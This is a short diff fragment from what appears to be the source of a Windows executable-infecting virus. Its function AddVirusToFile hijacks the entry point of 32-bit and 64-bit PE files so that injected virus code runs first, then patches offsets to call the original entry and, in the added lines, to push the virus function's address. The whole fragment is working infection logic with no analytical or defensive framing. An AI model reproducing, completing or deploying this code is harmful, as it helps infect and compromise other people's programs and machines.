@@ -25,33 +25,33 @@ void WINAPI AddVirusToFile(PVOID file_data, DWORD file_size, PDATA data, LPDWORD
 
     if (Is64BitExecutable(file_data))
     {
-        DWORD entry_point_64bit = *(DWORD *)&section_data_global[4]; //0x28F0;
+        DWORD entry_point_64bit = *(DWORD *)&section_data_global[4]; 
         SetEntryPoint(file_data, virus_va_in_target + entry_point_64bit);
-        *(DWORD*)((unsigned char*)file_data + virus_ra_in_target + 
-                                            entry_point_64bit + DISTANCE_VIRUS_MAIN_TO_SECOND_BYTE_OF_CALL_EMPTY_X64
-                ) = target_entry_point - (virus_va_in_target + 
-                                            entry_point_64bit + DISTANCE_VIRUS_MAIN_TO_SECOND_BYTE_OF_CALL_EMPTY_X64 + sizeof(DWORD)
-                                ); 
+        PUCHAR modify_call_to_old_entry = (unsigned char*)file_data + virus_ra_in_target + entry_point_64bit + DISTANCE_VIRUS_MAIN_TO_SECOND_BYTE_OF_CALL_EMPTY_X64;
+        *(DWORD*)(modify_call_to_old_entry) = target_entry_point - (virus_va_in_target + 
+                                            entry_point_64bit + DISTANCE_VIRUS_MAIN_TO_SECOND_BYTE_OF_CALL_EMPTY_X64 + sizeof(DWORD));
     }
     else
     {
-        DWORD entry_point_32bit = *(DWORD *)&section_data_global[0]; //0xca0;
+        DWORD image_base = GetImageBase32(file_data);
+        DWORD entry_point_32bit =   *(DWORD *)&section_data_global[0]; 
         SetEntryPoint(file_data, virus_va_in_target + entry_point_32bit);
-        *(DWORD*)((unsigned char*)file_data + virus_ra_in_target + 
-                                            entry_point_32bit + DISTANCE_VIRUS_MAIN_TO_SECOND_BYTE_OF_CALL_EMPTY_X86
-                ) = target_entry_point - (virus_va_in_target + 
-                                            entry_point_32bit + DISTANCE_VIRUS_MAIN_TO_SECOND_BYTE_OF_CALL_EMPTY_X86 + sizeof(DWORD)
-                                        );
+        PUCHAR modify_call_to_old_entry = (unsigned char*)file_data + virus_ra_in_target + entry_point_32bit + DISTANCE_VIRUS_MAIN_TO_SECOND_BYTE_OF_CALL_EMPTY_X86;
+
+        *(DWORD*)(modify_call_to_old_entry) = target_entry_point - (virus_va_in_target + entry_point_32bit + DISTANCE_VIRUS_MAIN_TO_SECOND_BYTE_OF_CALL_EMPTY_X86 + sizeof(DWORD));
+        
+        PUCHAR modify_push_virus_function = (unsigned char*)file_data + virus_ra_in_target + entry_point_32bit + DISTANCE_VIRUS_MAIN_TO_SECOND_BYTE_OF_PUSH_VIRUSFUNCTION_X86;
+
+        *(DWORD*)(modify_push_virus_function) = image_base + virus_va_in_target + entry_point_32bit + 0x70;
     }
 
-    *(DWORD*)new_file_size = (DWORD)file_size + (DWORD)section_data_global.size();
+    *(DWORD*)new_file_size = (DWORD)file_size;
     return;
 }
 
 
 int main()
-{
-
+{    
 	char buf[MAX_PATH];
     GetModuleFileNameA(nullptr, buf, MAX_PATH);
     std::string current_file = buf;
